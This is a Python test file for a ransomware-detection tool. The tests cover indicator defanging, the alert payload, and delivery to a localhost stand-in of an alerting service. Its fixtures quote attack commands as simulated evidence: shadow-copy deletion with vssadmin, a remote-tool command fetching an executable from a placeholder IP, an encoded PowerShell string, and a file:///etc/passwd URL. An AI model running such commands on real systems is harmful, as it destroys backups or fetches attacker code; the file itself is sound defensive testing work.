"""Pushing incidents to IntelPulse: the payload's shape, defanging, and a dead endpoint degrading.

The endpoint is a real HTTP server on 127.0.0.1, run by the test, that answers the way IntelPulse's
POST /api/alerts does (or fails the ways a real one can). Nothing leaves the machine.
"""

import json
import logging
import re
import socket
import threading
import time
from datetime import UTC, datetime, timedelta
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from dwellwatch import webhook
from dwellwatch.burst import note_bursts
from dwellwatch.correlate import correlate, main
from dwellwatch.models import Severity, Signal, Stage
from dwellwatch.newsource import new_sources
from dwellwatch.replay import EVIDENCE_CHARS, EVIDENCE_FIELDS, evidence, load_events, load_rules, replay
from dwellwatch.webhook import ConfigurationError, Endpoint, alert_id, defang, endpoint, payload, push

from conftest import dataset, security_event

T0 = datetime(2025, 4, 24, 9, 0, tzinfo=UTC)
SHA = "935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2"
TOKEN = "not-a-real-token-4f1d"
TITLES = {"rule-5": "Shadow Copies Deleted With vssadmin", "rule-2": "Remote Access Tool Started",
          "rule-6": "Ransom Note Written"}


def signal(stage, at, rule, host="WS01.lab.local", user="LAB\\jdoe", evidence=()):
    return Signal(stage=stage, host=host, user=user, timestamp=at, rule_id=rule, attack_technique={
        Stage.REMOTE_DISCOVERY: "T1219", Stage.BACKUP_DESTRUCTION: "T1490", Stage.ENCRYPTION: "T1486"}[stage],
        severity=Severity.HIGH, evidence=evidence)


def an_incident(extra_notes=0):
    tool = signal(Stage.REMOTE_DISCOVERY, T0, "rule-2", evidence=(
        ("Image", "C:\\Users\\Public\\AnyDesk.exe"), ("Hashes", f"SHA256={SHA}"),
        ("CommandLine", "AnyDesk.exe --silent --update http://203.0.113.10/ad.exe relay.example.com"),
    ))
    shadow = signal(Stage.BACKUP_DESTRUCTION, T0 + timedelta(hours=2), "rule-5", user="NT AUTHORITY\\SYSTEM",
                    evidence=(("Image", "C:\\Windows\\System32\\vssadmin.exe"),
                              ("CommandLine", "vssadmin delete shadows /all /quiet")))
    notes = [signal(Stage.ENCRYPTION, T0 + timedelta(hours=3, seconds=i), "rule-6", user=None,
                    evidence=(("TargetFilename", f"C:\\Shares\\dir{i}\\HOW_TO_RESTORE_MY_FILES.txt"),))
             for i in range(1 + extra_notes)]
    [incident] = correlate([tool, shadow, *notes])
    return incident


# --- defanging --------------------------------------------------------------------------------


@pytest.mark.parametrize("text, safe", [
    ("http://203.0.113.10/ad.exe", "hxxp://203[.]0[.]113[.]10/ad.exe"),
    ("https://evil.example.com/x?a=1", "hxxps://evil[.]example[.]com/x?a=1"),
    ("from 10.0.0.5 to 198.51.100.7", "from 10[.]0[.]0[.]5 to 198[.]51[.]100[.]7"),
    ("relay.example.com and cdn.example.org", "relay[.]example[.]com and cdn[.]example[.]org"),
    ("C:\\Windows\\System32\\cmd.exe /c ntds.dit", "C:\\Windows\\System32\\cmd.exe /c ntds.dit"),
    ("System.Management.Automation.dll v1.0", "System.Management.Automation.dll v1.0"),
    ("dc01.corp.local", "dc01.corp.local"),
])
def test_indicators_are_defanged_and_file_names_are_not(text, safe):
    assert defang(text) == safe
    assert defang(safe) == safe  # defanging twice changes nothing


# --- what signals carry -----------------------------------------------------------------------


def test_a_rule_signal_carries_its_events_fields_and_only_the_sha256_of_sysmons_hashes():
    [first, *_] = replay(load_events(dataset("T1490/atomic_red_team/windows-sysmon.log")), load_rules())
    fields = dict(first.evidence)
    assert fields["Image"].lower().endswith(".exe") and fields["CommandLine"]
    assert re.fullmatch(r"SHA256=[0-9A-F]{64}", fields["Hashes"])  # no MD5, no IMPHASH
    assert list(fields) == [name for name in EVIDENCE_FIELDS if name in fields]  # in a fixed order


def test_evidence_values_are_trimmed_and_empty_fields_left_out():
    long = "powershell -enc " + "A" * 5_000
    fields = dict(evidence({"CommandLine": long, "Image": "C:\\x.exe", "IpAddress": "-", "User": "LAB\\jdoe",
                            "Hashes": "MD5=00,IMPHASH=11"}))
    assert len(fields["CommandLine"]) == EVIDENCE_CHARS and fields["CommandLine"].endswith("…")
    assert set(fields) == {"CommandLine", "Image"}


def test_the_counters_signals_carry_what_they_counted():
    [spray] = note_bursts(load_events(dataset(DATA2)))
    assert dict(spray.evidence)["Folders"] == "20 within 10 minutes"
    assert dict(spray.evidence)["TargetFilename"].endswith("HOW_TO_RESTORE_MY_FILES.txt")
    usual = [security_event(4624, host=host, time=(T0 + timedelta(days=d)).isoformat(), LogonType="3",
                            IpAddress="10.0.0.21", TargetUserName="jdoe", TargetDomainName="LAB")
             for d in range(15) for host in ("FS01", "DC01")]
    spread = [security_event(4624, host=host, time=(T0 + timedelta(days=16, minutes=i)).isoformat(),
                             LogonType="10", IpAddress="10.0.0.99", TargetUserName="jdoe", TargetDomainName="LAB")
              for i, host in enumerate(("WS02", "SRV01"))]
    [new_source] = new_sources(usual + spread)
    assert dict(new_source.evidence) == {"IpAddress": "10.0.0.99", "LogonType": "10", "Hosts": "srv01, ws02"}


# --- the payload ------------------------------------------------------------------------------


def test_the_payload_is_the_incident_as_intelpulses_alert():
    incident = an_incident()
    body = payload(incident, TITLES)
    assert body["source"] == "dwellwatch" and re.fullmatch(r"dw-[0-9a-f]{16}", body["alert_id"])
    assert body["title"] == "DwellWatch: CRITICAL incident on host ws01"
    assert body["severity"] == "critical"
    assert body["description"].startswith(incident.reason) and "3 signal(s)" in body["description"]
    assert body["entities"] == [{"kind": "host", "name": "ws01"}, {"kind": "user", "name": "LAB\\jdoe"}]
    assert body["attack_techniques"] == ["T1219", "T1486", "T1490"]
    assert body["first_seen"] == "2025-04-24T09:00:00Z" and body["last_seen"] == "2025-04-24T12:00:00Z"
    assert body["indicators"] == [SHA.lower()]  # what threat intelligence can look up


def test_evidence_is_defanged_labelled_and_in_time_order():
    evidence = payload(an_incident(), TITLES)["evidence"]
    assert [item["time"] for item in evidence] == sorted(item["time"] for item in evidence)
    first = evidence[0]
    assert first["label"] == "stage 2 (remote tooling and discovery): Remote Access Tool Started, ws01, LAB\\jdoe"
    assert "hxxp://203[.]0[.]113[.]10/ad.exe" in first["text"] and "relay[.]example[.]com" in first["text"]
    assert "http://" not in json.dumps(evidence) and "203.0.113.10" not in json.dumps(evidence)
    assert "AnyDesk.exe" in first["text"] and f"SHA256={SHA}" in first["text"]


def test_a_long_signal_is_cut_to_what_intelpulse_accepts():
    fields = tuple((name, name[0] * 999) for name in ("Image", "CommandLine", "ParentImage", "TargetFilename",
                                                      "SourceImage", "TargetImage"))
    [incident] = correlate([signal(Stage.REMOTE_DISCOVERY, T0, "rule-2", evidence=fields),
                            signal(Stage.BACKUP_DESTRUCTION, T0 + timedelta(hours=1), "rule-5")])
    text = payload(incident, TITLES)["evidence"][0]["text"]
    assert len(text) == webhook.MAX_TEXT and text.endswith("…")


def test_many_signals_of_one_rule_are_summarised():
    evidence = payload(an_incident(extra_notes=82), TITLES)["evidence"]
    notes = [item for item in evidence if "Ransom Note Written" in item["label"]]
    assert len(notes) == webhook.PER_RULE + 1
    assert notes[-1] == {"time": None, "label": "78 more from Ransom Note Written", "text": ""}


def test_the_alert_id_is_the_same_for_a_retry_and_new_for_a_new_stage():
    incident = an_incident()
    assert alert_id(incident) == alert_id(an_incident())
    assert alert_id(an_incident(extra_notes=5)) == alert_id(incident)  # more of the same stages
    [two_stages] = correlate([s for s in incident.signals if s.stage is not Stage.ENCRYPTION])
    assert alert_id(two_stages) != alert_id(incident)


def test_the_payload_keeps_within_what_intelpulse_accepts():
    # The limits of IntelPulse's AlertIn (backend/app/schemas.py), which refuses anything else with a 422.
    body = payload(an_incident(extra_notes=500), TITLES)
    assert re.fullmatch(r"[A-Za-z0-9_.-]{1,40}", body["source"])
    assert re.fullmatch(r"[A-Za-z0-9_.:-]{1,200}", body["alert_id"])
    assert 1 <= len(body["title"]) <= 200 and len(body["description"]) <= 4_000
    assert body["severity"] in ("informational", "low", "medium", "high", "critical")
    assert all(re.fullmatch(r"T\d{4}(\.\d{3})?", t) for t in body["attack_techniques"])
    assert len(body["entities"]) <= 50 and all(re.fullmatch(r"[A-Za-z_-]+", e["kind"]) for e in body["entities"])
    assert len(body["indicators"]) <= 500 and len(body["evidence"]) <= 200
    assert all(len(item["label"]) <= 300 and len(item["text"]) <= 4_000 for item in body["evidence"])
    assert len(json.dumps(body)) < 1024 * 1024


# --- a stand-in IntelPulse --------------------------------------------------------------------


class StubIntelPulse:
    """Answers POST /api/alerts as IntelPulse does, or as a broken one would."""

    def __init__(self, status=201, answer=None, delay=0.0, redirect=None, redirect_status=307, raw=None):
        self.requests = []
        stub = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802  (only a followed redirect would arrive as a GET)
                stub.requests.append({"path": self.path, "headers": dict(self.headers), "json": None})
                self.send_response(404)
                self.end_headers()

            def do_POST(self):  # noqa: N802
                body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
                stub.requests.append({"path": self.path, "headers": dict(self.headers), "json": json.loads(body)})
                time.sleep(delay)
                if redirect:
                    self.send_response(redirect_status)
                    self.send_header("Location", redirect)
                    self.end_headers()
                    return
                data = raw if raw is not None else json.dumps(answer if answer is not None else {
                    "case_id": "c-1", "duplicate": status == 200, "ticket_level": "critical",
                    "report": "/api/cases/c-1/report"}).encode()
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def log_message(self, *args):
                pass

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self.server.server_port}/api/alerts"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self):
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def intelpulse():
    stubs = []

    def start(**kwargs):
        stubs.append(StubIntelPulse(**kwargs))
        return stubs[-1]

    yield start
    for stub in stubs:
        stub.close()


def a_closed_port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def test_a_push_posts_the_payload_and_reads_back_the_case(intelpulse):
    stub = intelpulse()
    incident = an_incident()
    [delivery] = push([incident], TITLES, Endpoint(stub.url, TOKEN))
    assert delivery.delivered and delivery.status == 201 and delivery.case_id == "c-1"
    assert "report /api/cases/c-1/report" in delivery.detail
    [request] = stub.requests
    assert request["path"] == "/api/alerts" and request["json"] == payload(incident, TITLES)
    assert request["headers"]["Authorization"] == f"Bearer {TOKEN}"
    assert request["headers"]["Content-Type"] == "application/json"
    assert request["headers"]["User-Agent"].startswith("DwellWatch/")


def test_without_a_token_no_authorization_header_is_sent(intelpulse):
    stub = intelpulse()
    push([an_incident()], TITLES, Endpoint(stub.url))
    assert "Authorization" not in stub.requests[0]["headers"]


def test_an_alert_intelpulse_already_has_counts_as_delivered(intelpulse):
    [delivery] = push([an_incident()], TITLES, Endpoint(intelpulse(status=200).url))
    assert delivery.delivered and "(already received)" in delivery.detail


def test_a_dead_endpoint_degrades_instead_of_failing(caplog):
    url = f"http://127.0.0.1:{a_closed_port()}/api/alerts"
    with caplog.at_level(logging.WARNING, logger="dwellwatch.webhook"):
        [delivery] = push([an_incident()], TITLES, Endpoint(url, TOKEN))
    assert not delivery.delivered and delivery.status is None
    assert delivery.detail.startswith("IntelPulse could not be reached")
    assert caplog.records and TOKEN not in caplog.text


@pytest.mark.parametrize("status, answer, expected", [
    (422, {"detail": [{"loc": ["body", "severity"], "msg": "bad"}]}, "IntelPulse refused it: 422"),
    (401, {"detail": "a valid API token is required"}, "IntelPulse refused it: 401 a valid API token is required"),
    (500, {"detail": "internal error"}, "IntelPulse refused it: 500 internal error"),
    (201, {"unexpected": True}, "IntelPulse answered without a case"),
])
def test_a_refusal_is_reported_with_intelpulses_reason_and_never_the_token(intelpulse, caplog, status, answer,
                                                                        expected):
    stub = intelpulse(status=status, answer=answer)
    with caplog.at_level(logging.INFO, logger="dwellwatch.webhook"):
        [delivery] = push([an_incident()], TITLES, Endpoint(stub.url, TOKEN))
    assert not delivery.delivered and delivery.detail.startswith(expected)
    assert TOKEN not in delivery.detail and TOKEN not in caplog.text


def test_an_answer_that_is_not_json_is_not_a_delivery(intelpulse):
    [delivery] = push([an_incident()], TITLES, Endpoint(intelpulse(raw=b"<html>proxy error</html>").url))
    assert not delivery.delivered and "not with JSON" in delivery.detail


def test_a_slow_endpoint_times_out_instead_of_holding_the_run(intelpulse):
    stub = intelpulse(delay=2.0)
    started = time.monotonic()
    [delivery] = push([an_incident()], TITLES, Endpoint(stub.url), timeout=0.3)
    assert not delivery.delivered and time.monotonic() - started < 1.5


@pytest.mark.parametrize("status", [301, 302, 303, 307, 308])
def test_a_redirect_is_not_followed_so_the_token_goes_nowhere_else(intelpulse, status):
    elsewhere = intelpulse()
    stub = intelpulse(redirect=elsewhere.url, redirect_status=status)
    [delivery] = push([an_incident()], TITLES, Endpoint(stub.url, TOKEN))
    assert not delivery.delivered and delivery.status == status
    assert elsewhere.requests == []  # Python would follow a 302 as a GET, Authorization and all


def test_one_failed_push_does_not_stop_the_others(intelpulse):
    stub = intelpulse()
    [earlier] = correlate([s for s in an_incident().signals if s.stage is not Stage.ENCRYPTION])
    incidents = [an_incident(), earlier]
    dead = push(incidents, TITLES, Endpoint(f"http://127.0.0.1:{a_closed_port()}/api/alerts"))
    live = push(incidents, TITLES, Endpoint(stub.url))
    assert [d.delivered for d in dead] == [False, False] and [d.delivered for d in live] == [True, True]


# --- configuration ----------------------------------------------------------------------------


def test_the_endpoint_comes_from_the_environment_before_the_dotenv_file(tmp_path):
    dotenv = tmp_path / ".env"
    dotenv.write_text("# pushed incidents\nINTELPULSE_WEBHOOK_URL=http://localhost:8000/api/alerts\n"
                      "INTELPULSE_API_TOKEN='from-dotenv'\n")
    assert endpoint({}, dotenv) == Endpoint("http://localhost:8000/api/alerts", "from-dotenv")
    overridden = endpoint({"INTELPULSE_WEBHOOK_URL": "https://intelpulse.example/api/alerts"}, dotenv)
    assert overridden.url == "https://intelpulse.example/api/alerts" and overridden.token == "from-dotenv"
    assert endpoint({"INTELPULSE_WEBHOOK_URL": "http://h/api/alerts", "INTELPULSE_API_TOKEN": ""},
                    tmp_path / "none").token is None


@pytest.mark.parametrize("url, why", [
    ("", "is not set"),
    ("file:///etc/passwd", "must be an http:// or https:// URL"),
    ("localhost:8000/api/alerts", "must be an http:// or https:// URL"),
    ("ftp://intelpulse.example/api/alerts", "must be an http:// or https:// URL"),
    ("https://user:secret@intelpulse.example/api/alerts", "not in the URL"),
])
def test_a_bad_endpoint_is_refused_before_anything_is_sent(tmp_path, url, why):
    with pytest.raises(ConfigurationError, match=why):
        endpoint({"INTELPULSE_WEBHOOK_URL": url}, tmp_path / "none")


# --- the command line -------------------------------------------------------------------------

DATA2 = "malware/ransomware_ttp/data2/windows-sysmon.log"


@pytest.fixture
def no_dotenv(monkeypatch, tmp_path):
    monkeypatch.setattr(webhook, "DOTENV", tmp_path / "no.env")
    monkeypatch.delenv("INTELPULSE_WEBHOOK_URL", raising=False)
    monkeypatch.delenv("INTELPULSE_API_TOKEN", raising=False)


def test_the_command_line_pushes_a_real_incident(intelpulse, monkeypatch, no_dotenv, capsys):
    stub = intelpulse()
    monkeypatch.setenv("INTELPULSE_WEBHOOK_URL", stub.url)
    assert main([str(dataset(DATA2)), "--push"]) == 0
    assert "pushed 1 of 1 incident(s) to IntelPulse" in capsys.readouterr().out
    [request] = stub.requests
    sent = request["json"]
    assert sent["severity"] == "critical" and sent["attack_techniques"] == ["T1486", "T1490"]
    assert sent["entities"][0] == {"kind": "host", "name": "win-dc-385"}
    assert len(sent["indicators"]) >= 1 and all(re.fullmatch(r"[0-9a-f]{64}", h) for h in sent["indicators"])
    assert "83 more" not in json.dumps(sent) and "78 more from Ransom Note Written" in json.dumps(sent)


def test_the_command_line_reports_a_dead_endpoint_and_still_succeeds(monkeypatch, no_dotenv, capsys):
    monkeypatch.setenv("INTELPULSE_WEBHOOK_URL", f"http://127.0.0.1:{a_closed_port()}/api/alerts")
    assert main([str(dataset(DATA2)), "--push"]) == 0
    out, err = capsys.readouterr()
    assert "1 incident(s)" in out and "pushed 0 of 1" in out and "could not be reached" in err


def test_the_command_line_says_so_before_replaying_when_pushing_is_not_set_up(no_dotenv, capsys):
    assert main([str(dataset(DATA2)), "--push"]) == 2
    out, err = capsys.readouterr()
    assert out == "" and "INTELPULSE_WEBHOOK_URL is not set" in err
